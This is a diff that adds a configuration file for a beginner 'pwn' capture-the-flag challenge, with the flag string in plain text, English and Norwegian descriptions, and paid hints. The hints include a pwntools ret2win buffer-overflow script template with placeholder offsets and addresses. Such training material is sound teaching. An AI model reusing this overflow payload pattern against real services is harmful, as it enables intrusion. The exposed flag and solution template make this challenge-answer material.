@@ -1,0 +1,94 @@
+# Challenge most also include these files:
+# - challenge/ - everything needed to create the challenge assets
+# - distfiles/ - contains all files that will be attached to the challenge
+# - solution/  - a working solution to the challenge (or a README.md with an explanation)
+
+name: binary
+flag: 'flag{im_what_your_looking_for}'
+category: pwn
+value: 150
+message: |
+  This time you’re more on your own.
+
+  The binary hides a flag in a secret function. To exploit the program you must find out how it works and calculate the right number of bytes to reach the return address.
+
+  But if you try some old overflow tricks, you’ll hit a known error in C programs.
+message_no: |
+  Denne gangen er du mer på egen hånd.
+
+  Binærfilen gjemmer et flagg i en hemmelig funksjon. For å utnytte programmet må du finne ut hvordan det fungerer, og regne ut riktig antall bytes for å nå returadressen.
+
+  Men prøver du noen gamle overflow-triks, støter du på en kjent feil i C-programmer.
+connection: nc <host> <port>
+port: <port>
+protocol: tcp
+notes: 64-bit ELF, no PIE, no canary. Simple overflow.
+
+# hints: paid hints in CTFd, synced from here on ./ctf.sh up (they used to come
+# from the imported backup). Format "COST | text"; hints_no holds the same
+# hints in Norwegian, in the same order (the cost is taken from hints).
+hints:
+  - |
+    9 | With the `objdump` you can calculate the offset you need to reach the return address.  
+
+    Now, the next step is deciding *where* to redirect execution.  
+
+    A useful command
+    ` nm -C ./binary | grep flag_function`
+
+    Place the function’s address after your offset so the program “returns” into it.
+
+    But on x86-64, you may also need a tiny `ret` gadget before jumping, to keep the stack properly aligned.
+  - |
+    15 | Now put it all together in a script.  
+
+    Structure your payload like this:  
+
+    Tools like **pwntools** make this much easier:  
+
+    ```python
+    from pwn import *
+
+    HOST, PORT = "<host>", <port>   # from this challenge's connection info
+    io = remote(HOST, PORT)
+    payload = b"A" * <offset here>
+    payload += p64(<ret gadget address here>)      # Helps avoid crashes
+    payload += p64(<flag function address here>)   # address from `nm`
+
+    io.sendline(payload)
+    print(io.recvall().decode())
+    ```
+hints_no:
+  - |
+    9 | Med `objdump` kan du regne ut offseten du trenger for å nå returadressen.  
+
+    Neste steg er å bestemme *hvor* kjøringen skal sendes.  
+
+    En nyttig kommando
+    ` nm -C ./binary | grep flag_function`
+
+    Legg funksjonens adresse etter offseten, så programmet «returnerer» inn i den.
+
+    Men på x86-64 kan du også trenge en liten `ret`-gadget før hoppet, for å holde stacken riktig justert.
+  - |
+    15 | Sett alt sammen i et skript.  
+
+    Bygg opp payloaden slik:  
+
+    Verktøy som **pwntools** gjør dette mye enklere:  
+
+    ```python
+    from pwn import *
+
+    HOST, PORT = "<host>", <port>   # fra tilkoblingsinfoen til oppgaven
+    io = remote(HOST, PORT)
+    payload = b"A" * <offset her>
+    payload += p64(<adressen til ret-gadgeten her>)    # Hjelper mot krasj
+    payload += p64(<adressen til flaggfunksjonen her>) # adresse fra `nm`
+
+    io.sendline(payload)
+    print(io.recvall().decode())
+    ```
+
+# Hidden in CTFd for this event; kept ready to release. State applied on import.
+state: hidden
